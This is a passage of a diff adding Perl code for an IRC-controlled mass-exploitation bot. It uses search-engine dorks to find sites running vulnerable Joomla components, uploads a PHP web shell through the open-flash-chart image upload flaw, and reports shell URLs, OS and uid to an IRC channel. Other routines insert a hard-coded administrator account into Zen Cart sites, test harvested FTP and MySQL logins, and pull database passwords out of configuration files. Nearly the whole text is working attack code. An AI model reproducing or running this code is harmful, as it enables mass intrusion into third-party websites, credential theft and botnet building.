+my $type = $rceinjector."?url=".$site."&type=maian15";
+
+my $cekk = &get_content($type);
+$check = &get_content($maian15shell."?kliverz");
+&get_content($maian15shell."?delete");
+&get_content($maian15shell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/i) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$maian15logo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$maian15logo15$engine 4<9=4>9 sHeLL 4<9=4>9 $maian15shell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub acy_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$acylogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$acylogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $acyshell = "http://".$site."/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/kliverz.php";
+
+my $acys = "http://".$site."/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($acys);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$acylogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=acy";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($acyshell."?kliverz");
+&get_content($acyshell."?delete");
+&get_content($acyshell."?botnet");
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$acylogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$acylogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $acyshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+
+}
+			} exit; }
+		}
+	}
+}
+
+sub jinc_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jinclogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$jinclogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $jincshell = "http://".$site."/administrator/components/com_jinc/classes/graphics/tmp-upload-images/kliverz.php";
+
+my $jincs = "http://".$site."/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($jincs);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$jinclogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=jinc";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($jincshell."?kliverz");
+&get_content($jincshell."?delete");
+&get_content($jincshell."?botnet");
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$jinclogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$jinclogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $jincshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+
+}
+
+}
+			} exit; }
+		}
+	}
+}
+
+
+sub jnews_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jnewslogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$jnewslogo15$engine 9Finished 15for 9$dork "); }
+
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+my $nama = $simpan;
+my $jnewsshell = "http://".$site."/components/com_jnews/includes/openflashchart/tmp-upload-images/kliverz.php";
+
+my $jnewss = "http://".$site."/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php";
+my $cek  = &get_content($jnewss);
+				if ($cek =~ /Saving your image/i){
+					&msg("$chan","$jnewslogo15$engine 9e3x9p3l9o3i9t3i9n3g 15http://$site ");
+
+my $type = $rceinjector."?url=".$site."&type=jnews";
+
+
+my $cekk = &get_content($type);
+$check = &get_content($jnewsshell."?kliverz");
+&get_content($jnewsshell."?delete");
+&get_content($jnewsshell."?botnet");
+
+if ($cekk =~ /sukses bos kliverz/i){
+				if ($check =~ /Indramayu CyBer/) {				my $safe = ""; my $os = ""; my $uid = "";
+
+				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
+				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
+				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
+				&msg("$chan","$jnewslogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
+				&msg("$nama","$jnewslogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $jnewsshell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
+
+}
+}
+}
+			} exit; }
+		}
+	}
+}
+sub zen_exploit() {
+	my $chan = $_[0];
+	my $bug = $_[1];
+	my $simpan = $_[2];
+	my $dork = $_[3];
+	my $engine = $_[4];
+	my $count = 0;
+	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$zenlogo);
+	my $num = scalar(@totexploit);
+	if ($num > 0){
+		foreach my $site(@totexploit){
+		$count++;
+		if ($count == $num-1) { &msg("$chan","$zenlogo15$engine 9Finished 15for 9$dork "); }
+			
+			my $test  = "http://".$site.$bug;
+			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
+				my $html  = &get_content($test);
+				if ($html =~ /zc_install/){
+				&msg("$chan","$zenlogo15$engine 9e3x9p3l9o3i9t3i9n3g 15 ");
+					&zen_query($chan,$site,$test,$engine,$simpan);
+				}
+			} exit; }
+		}
+	}
+}
+
+sub zen_query() {
+	my $chan = $_[0];
+	my $url = $_[1];
+	my $test = $_[2];
+	my $engine = $_[3];
+	my $simpan = $_[4];
+	my $code  = "INSERT INTO admin (admin_id, admin_name, admin_email, admin_pass) VALUES (2283,'abc','localhost','617ec22fbb8f201c366e9848c0eb6925:87');";
+	my $req = HTTP::Request->new(POST => $test);
+	my $nama = $simpan;
+	
+	$req->content_type("application/x-www-form-urlencoded");
+	$req->content("query_string=".$code);
+	my $ua = LWP::UserAgent->new(agent => $uagent);
+	$ua->timeout(3);
+	my $res = $ua->request($req);
+	my $data = $res->as_string;
+	if ( $data =~ /1 statements processed/i ) {
+	my $vuln = "http://".$url."admin/login.php";
+	my $user = "abc";
+	my $pass = "wew";
+		&msg("$chan","$zenlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (USER=$user) (PASS=$pass) ");
+		&msg("$nama","$zenlogo15$engine 4<9=4>9 Admin login 4<9=4>9 $vuln15 (USER=$user) (PASS=$pass) ");
+		&msg("$admin","$zenlogo15$engine 4<9=4>9 Admin login 4<9=4>9 $vuln15 (USER=$user) (PASS=$pass) ");
+
+	}
+	elsif ( $data =~ /Duplicate entry/i ) {
+	my $vuln = "http://".$url."admin/login.php";
+	my $user = "abc";
+	my $pass = "wew";	
+	    &msg("$chan","$zenlogo4TARGET1 12SEND 3TO 13$nama Selamatt Yaaa... ^_^ 4<9=4> (USER=$user) (PASS=$pass) ");
+		&msg("$nama","$zenlogo15$engine 4<9=4>9 Admin login (Lawas) 4<9=4>9 $vuln15 (USER=$user) (PASS=$pass) ");
+		&msg("$admin","$zenlogo15$engine 4<9=4>9 Admin login 4<9=4>9 $vuln15 (USER=$user) (PASS=$pass) ");
+
+	}
+}
+
+
+sub ftp_connect {
+	my $url = $_[0];
+	my $host = $_[1];
+	my $user = $_[2];
+	my $pass = $_[3];
+	my $chan = $_[4];
+	my $engine = $_[5];
+	my $logo = $_[6];
+	my $success = 1;
+	use Net::FTP;
+	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 7);
+		$success = 0 if $ftp->login($user,$pass);
+		$ftp->quit;
+		if ($success == 0) {
+		&msg("$chanxxx","$logo15$engine 9<4=9>9 FTP 15[ 9http://".$host." 15] [4 ".$user.":".$pass." 15]");
+	}
+}
+sub dbi_connect () {
+	my $host = $_[0];
+	my $user = $_[1];
+	my $pass = $_[2];
+	my $dtbs = $_[3];
+	my $chan = $_[4];
+	my $engine = $_[5];
+	my $logo = $_[6];
+	my $port = "3306";
+	my $platform = "mysql";
+	my $dsn = "dbi:$platform:$dtbs:$host:$port";
+	my $DBIconnect=  DBI->connect($dsn,$user,$pass);
+		if ($DBIconnect) {
+		&msg("$chanxxx","$logo15$engine 9<4=9>9 MySql 15[ 9http://".$host." 15] [4 Connected 15]");
+	}
+}
+sub getUserPass() {
+	my $string = $_[0];
+	my @lol = split("\r\n", $string);
+	my $pass = "";
+	my $user = "";
+	foreach my $line (@lol) {
+		if(($line =~ m/db_password(.*?)=(.*?)'(.+?)';/i) or ($line =~ m/db_password(.*?)=(.*?)"(.+?)";/i)) {
+			$pass = $3;
+		}
+		if(($line =~ m/db_username(.*?)=(.*?)'(.+?)';/i) or ($line =~ m/db_username(.*?)=(.*?)"(.+?)";/i)) {
+			$user = $3;
+		}
+	}
+	return $user.":Viva-Byroe.Net:".$pass;
+}
+
+sub getinfo() {
+	my $string = $_[0];
+	my @lol = split("\r\n", $string);
+	my $pass = "";
+	my $user = "";
+	my $dbs = "";
+	foreach my $line (@lol) {
+		if(($line =~ m/db_password(.*?)=(.*?)'(.+?)';/i) or ($line =~ m/db_password(.*?)=(.*?)"(.+?)";/i)) {
+			$pass = $3;
+		}
+		if(($line =~ m/db_username(.*?)=(.*?)'(.+?)';/i) or ($line =~ m/db_username(.*?)=(.*?)"(.+?)";/i)) {
+			$user = $3;
+		}
+		if(($line =~ m/db_name(.*?)=(.*?)'(.+?)';/i) or ($line =~ m/db_name(.*?)=(.*?)"(.+?)";/i)) {
+			$dbs = $3;
+		}
+	}
+	return $user.":user:".$pass.":pass:".$dbs;
+}
+
+##################################################################################
+
+sub search_engine() {
+    my (@total,@clean);
+    my $chan = $_[0];
+    my $bug = $_[1];
+    my $dork = $_[2];
+    my $engine = $_[3];
+    my $logo = $_[4];
+	if ($gps == 1) {
+    if ($engine eq "JacKAE") { my @jackae = &jack1($dork."+site:ae"); push(@total,@jackae); }
+    if ($engine eq "JacKAR") { my @jackar = &jack2($dork."+site:ar"); push(@total,@jackar); }
+    if ($engine eq "JacKAT") { my @jackat = &jack3($dork."+site:at"); push(@total,@jackat); }
+    if ($engine eq "JacKAU") { my @jackau = &jack4($dork."+site:au"); push(@total,@jackau); }
+    if ($engine eq "JacKBR") { my @jackbr = &jack5($dork."+site:br"); push(@total,@jackbr); }
+    if ($engine eq "JacKCA") { my @jackca = &jack6($dork."+site:ca"); push(@total,@jackca); }
+    if ($engine eq "JacKCL") { my @jackcl = &jack7($dork."+site:cl"); push(@total,@jackcl); }
+    if ($engine eq "JacKCN") { my @jackcn = &jack8($dork."+site:cn"); push(@total,@jackcn); }
+    if ($engine eq "JacKCoM") { my @jackcom = &jack9($dork."+site:com"); push(@total,@jackcom); }
+    if ($engine eq "JacKCZ") { my @jackcz = &jack10($dork."+site:cz"); push(@total,@jackcz); }
+    if ($engine eq "JacKDE") { my @jackde = &jack1($dork."+site:de"); push(@total,@jackde); }
+    if ($engine eq "JacKDK") { my @jackdk = &jack2($dork."+site:dk"); push(@total,@jackdk); }
+    if ($engine eq "JacKES") { my @jackes = &jack3($dork."+site:es"); push(@total,@jackes); }
+    if ($engine eq "JacKEU") { my @jackeu = &jack4($dork."+site:eu"); push(@total,@jackeu); }
+    if ($engine eq "JacKFR") { my @jackfr = &jack5($dork."+site:fr"); push(@total,@jackfr); }
+    if ($engine eq "JacKHU") { my @jackhu = &jack6($dork."+site:hu"); push(@total,@jackhu); }
+    if ($engine eq "JacKID") { my @jackid = &jack7($dork."+site:id"); push(@total,@jackid); }
+    if ($engine eq "JacKIL") { my @jackil = &jack8($dork."+site:il"); push(@total,@jackil); }
+    if ($engine eq "JacKIN") { my @jackin = &jack9($dork."+site:in"); push(@total,@jackin); }
+    if ($engine eq "JacKInfO") { my @jackinfo = &jack10($dork."+site:info"); push(@total,@jackinfo); }
+    if ($engine eq "JacKIR") { my @jackir = &jack1($dork."+site:ir"); push(@total,@jackir); }
+    if ($engine eq "JacKIT") { my @jackit = &jack2($dork."+site:it"); push(@total,@jackit); }
+    if ($engine eq "JacKJP") { my @jackjp = &jack3($dork."+site:jp"); push(@total,@jackjp); }
+    if ($engine eq "JacKKR") { my @jackkr = &jack4($dork."+site:kr"); push(@total,@jackkr); }
+    if ($engine eq "JacKMX") { my @jackmx = &jack5($dork."+site:mx"); push(@total,@jackmx); }
+    if ($engine eq "JacKMY") { my @jackmy = &jack6($dork."+site:my"); push(@total,@jackmy); }
+    if ($engine eq "JacKNeT") { my @jacknet = &jack7($dork."+site:net"); push(@total,@jacknet); }
+    if ($engine eq "JacKNL") { my @jacknl = &jack8($dork."+site:nl"); push(@total,@jacknl); }
+    if ($engine eq "JacKOrG") { my @jackorg = &jack9($dork."+site:org"); push(@total,@jackorg); }
+    if ($engine eq "JacKPH") { my @jackph = &jack10($dork."+site:ph"); push(@total,@jackph); }
+    if ($engine eq "JacKPL") { my @jackpl = &jack1($dork."+site:pl"); push(@total,@jackpl); }
+    if ($engine eq "JacKRO") { my @jackro = &jack2($dork."+site:ro"); push(@total,@jackro); }
+    if ($engine eq "JacKRU") { my @jackru = &jack3($dork."+site:ru"); push(@total,@jackru); }
+    if ($engine eq "JacKTH") { my @jackth = &jack4($dork."+site:th"); push(@total,@jackth); }
+    if ($engine eq "JacKUA") { my @jackua = &jack5($dork."+site:ua"); push(@total,@jackua); }
+    if ($engine eq "JacKUK") { my @jackuk = &jack6($dork."+site:uk"); push(@total,@jackuk); }
+    if ($engine eq "JacKUS") { my @jackus = &jack7($dork."+site:us"); push(@total,@jackus); }
+    if ($engine eq "JacKSI") { my @jacksi = &jack8($dork."+site:si"); push(@total,@jacksi); }
+    if ($engine eq "JacKBE") { my @jackbe = &jack9($dork."+site:be"); push(@total,@jackbe); }
+    if ($engine eq "JacKBIZ") { my @jackbiz = &jack10($dork."+site:biz"); push(@total,@jackbiz); }
+	}
+ 
+
+   if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
+
+
+	if ($gps2 == 1) {
+    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
+    if ($engine eq "YaHoo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }
+    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
+    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
+    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
+    if ($engine eq "OnEt") { my @onet = &onet($dork); push(@total,@onet); }
+    if ($engine eq "CLusTy") { my @clusty = &clusty($dork); push(@total,@clusty); }
+    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }
+    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
+    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }
+    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
+    if ($engine eq "SeZNam") { my @seznam = &seznam($dork); push(@total,@seznam); }
+    if ($engine eq "BigLobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }
+	}
+    @clean = &clean(@total);
+    if ($silentmode == 0) {
+   &msg("$chan","$logo15,1$engine 4,1 ".scalar(@clean)." 15Total Clean"); }
+    return @clean;
+}
+##################################################################################
+sub isFound() {
+    my $status = 0;
+    my $link = $_[0];
+    my $reqexp = $_[1];
+    my $res = &get_content($link);
+    if ($res =~ /$reqexp/) { $status = 1 }
+    return $status;
+}
+
+sub get_content() {
+    my $url = $_[0];
+    my $ua = LWP::UserAgent->new(agent => $uagent);
+    $ua->timeout($timot);
+    my $req = HTTP::Request->new(GET => $url);
+    my $res = $ua->request($req);
+    return $res->content;
+}
+######################################### SEARCH ENGINE
+
+
+sub jack1() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack1.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+sub jack2() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack2.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack3() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack3.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack4() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack4.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack5() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack5.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack6() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack6.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack7() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack7.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack8() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack8.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack9() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack9.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub jack10() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ($jack10.uri_escape($key)."&num=100&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub google() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=0; $i<=1000; $i+=100){
+        my $search = ("http://www.google.com/search?q=".uri_escape($key)."&num=100&filter=0&start=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /google/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub walla() {
+	my @list;
+	my $key = $_[0];
+	for ($b=0; $b<=100; $b+=1) {
+        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {
+            my $link = $1;
+            if ($link !~ /walla\.co\.il/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub yahoo(){
+    my @list;
+	my $key = $_[0];
+	for ($b=1; $b<=1000; $b+=10) {
+        my $search = ("http://search.yahoo.com/search?p=".uri_escape($key)."&b=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
+            my $link = $1;
+            if ($link !~ /yahoo\.com/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub ask() {
+	my @list;
+	my $key = $_[0];
+	for (my $i=1; $i<=1000; $i+=100) {
+		my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");
+		my $res = &search_engine_query($search);
+		while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
+            my $link = $1;
+			if ($link !~ /ask\.com/){
+				my @grep = &links($link);
+				push(@list,@grep);
+			}
+		}
+	}
+	return @list;
+}
+
+sub onet() {
+	my @list;
+	my $key = $_[0];
+	my $b   = 0;
+	for ($b=1; $b<=400; $b+=10) {
+		my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));
+		my $res = &search_engine_query($search);
+		while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {
+			my $link = $1;
+			if ($link !~ /onet|webcache|query/){
+				my @grep = &links($link);
+                push(@list,@grep);
+			}
+		}
+	}
+	return @list;
+}
+
+sub clusty() {
+    my @list;
+	my $key = $_[0];
+    my $b   = 0;
+	for ($b=10; $b<=200; $b+=10) {
+        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");
+        my $res = &search_engine_query($search);
+		if ($res !~ /next/) {$b=100;}
+        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
+            my $link = $1;
+            if ($1 !~ /yippy\.com/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub bing() {
+    my @list;
+    my $key = $_[0];
+    for (my $i=1; $i<=400; $i+=10) {
+        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
+			my $link = $1;
+            if ($link !~ /google/) {
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub sapo(){
+    my @list;
+	my $key = $_[0];
+	for ($b=1; $b<=50; $b+=1) {
+        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".uri_escape($key)."&st=local");
+        my $res = &search_engine_query($search);
+		if ($res !~ m/Next/i) {$b=50;}
+        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
+            my $link = $1;
+            if ($1 !~ /\.sapo\.pt/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub lycos() { 
+  my @list;
+  my $key = $_[0];
+    for ($b=0; $b<=50; $b+=1) {
+        my $search = ("http://search.lycos.com/web?q=".uri_escape($key)."&pn=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/title=\"http:\/\/(.*?)\"/g) {
+            my $link = $1;
+            if ($link !~ /lycos\.com/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;	
+}
+
+sub uol() {
+	my @list;
+	my $key = $_[0];
+    for ($b=0; $b<=1000; $b+=10) {
+        my $search = ("http://busca.uol.com.br/web/?ref=homeuol&q=".uri_escape($key)."&start=".$b);
+        my $res = &search_engine_query($search);
+		if ($res =~ m/retornou nenhum resultado/i) {$b=500;}
+        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /uol\.com\.br|\/web/i){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub seznam() {
+	my @list;
+	my $key = $_[0];
+    for ($b=1; $b<=300; $b+=20) {
+        my $search = ("http://search.seznam.cz/?q=".uri_escape($key)."&count=20&from=".$b);
+        my $res = &search_engine_query($search);
+        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
+            my $link = $1;
+            if ($link !~ /seznam\.cz|chytrevyhledavani\.cz|smobil\.cz|sklik\.cz/i){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;
+}
+
+sub hotbot() {
+  my @list;
+  my $key = $_[0];
+    for ($b=0; $b<=50; $b+=1) {
+        my $search = ("http://www.hotbot.com/search/web?pn=".$b."&q=".uri_escape($key));
+        my $res = &search_engine_query($search);
+		if ($res =~ m/had no web result/i) {$b=50;}
+        while ($res =~ m/href=\"http:\/\/(.+?)\" title=/g) {
+            my $link = $1;
+            if ($link !~ /hotbot\.com/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+    return @list;	
+}
+
+sub aol() {
+	my @list;
+	my $key = $_[0];
+	for ($b=0; $b<=300; $b+=10) {
+		my $search = ("http://search.aol.com/aol/search?q=".uri_escape($key)."&page=".$b);
+		my $res = &search_engine_query($search);
+		while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
+			my $link = $1;
+			if ($link !~ /aol\.com/){
+				my @grep = &links($link);
+				push(@list,@grep);
+			}
+		}
+	}
+	return @list;
+}
+
+sub biglobe {
+  my $key = $_[0];
+  my @list;
+  for ($b=1; $b<=500; $b+=10) {
+    $num += $num;
+    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".uri_escape($key)."&lr=all";
+    my $res = &search_engine_query($search);
+    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
+	    my $link = $1;
+        if ($link !~ /biglobe/){
+                my @grep = &links($link);
+                push(@list,@grep);
+            }
+        }
+    }
+
+    return @list;
+}
+
+#########################################
+
+sub clean() {
+    my @cln = ();
+    my %visit = ();
+    foreach my $element (@_) {
+        $element =~ s/\/+/\//g;
+        next if $visit{$element}++;
+        push @cln, $element;
+    }
+    return @cln;
+}
+
+sub links() {
+    my @list;
+    my $link = $_[0];
+    my $host = $_[0];
+    my $hdir = $_[0];
+    $hdir =~ s/(.*)\/[^\/]*$/\1/;
+    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+    $host .= "/";
+    $link .= "/";
+    $hdir .= "/";
+    $host =~ s/\/\//\//g;
+    $hdir =~ s/\/\//\//g;
+    $link =~ s/\/\//\//g;
+    push(@list,$link,$host,$hdir);
+    return @list;
+}
+
+sub search_engine_query() {
+	my $url = $_[0];
+	$url =~ s/http:\/\///;
